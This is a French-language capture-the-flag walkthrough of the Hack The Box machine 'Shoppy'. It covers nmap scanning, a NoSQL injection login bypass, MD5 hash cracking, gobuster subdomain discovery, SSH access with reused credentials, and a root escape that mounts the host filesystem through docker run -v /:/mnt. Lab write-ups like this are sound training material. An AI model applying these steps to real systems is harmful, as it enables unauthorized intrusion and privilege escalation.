# Shoppy - Easy

scan nmap:

```sql
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 13:50 EDT
Nmap scan report for 10.10.11.180
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```

Visite du site (en attendant on lance nikto et dirb et il faut rajouter le site dans /etc/hosts):

gros countdown avec du javascript de partout

page admin vers /admin avec système de login

le site passe les données dans l’URL (username et password)

load infini sur une injection SQL, vulnérable ??

pas de succès avec SQL, NoSQL ?

Oui c’était du NoSQL et c’était le champ username de vulnérable, on est log en admin sur un panel du site minimaliste

On trouve le hash du mdp admin: 23c6877d9e2b564ef8b32c3a23de27b2

hashcat 😈 → en fait non parce que GC pas détecté

John → cassage du mpd en cours

En attendant y’a pas d’autre vecteurs à part ssh et j’apprend que c’est possible d’utiliser gobuster pour trouver des sous domaines

```sql
gobuster vhost -u shoppy.htb -w /usr/share/wordlists/dirb/common.txt
```

→ pas la bonne wordlist, il en faut une spécifique genre celle là : [https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/bitquark-subdomains-top100000.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/bitquark-subdomains-top100000.txt)

```sql
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/vhost.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/03 15:17:46 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
                                                       
===============================================================
2022/11/03 15:26:38 Finished
===============================================================
```

john donne rien donc hashcat sur host → donne rien

casseur de md5 en ligne →

Marche pas avec le hash de admin mais marche avec le hash de josh

```sql
r******************y
```

Maintenant qu’on a le mdp et le sous-domaine on peut essayer de se log (il faut ajouter au host comme d’hab)

On obtient les creds de jaeger et on récupére le flag user en ssh !

jaeger peut executer un certain executable en temps que deploy alors on accède à un password manager qui nous demande un mdp

En regardant l’executable de plus près on trouve le résultat à entre et on obtient des creds !

On peut donc su en tant que deploy

Créer un docker -v pour share les directory donc / dans /mnt du docker

```sql
docker run -v /:/mnt -di --name test alpine:latest
```

Executer un shell dessus

```sql
docker exec -ti test sh
```

Et on obtient le flag !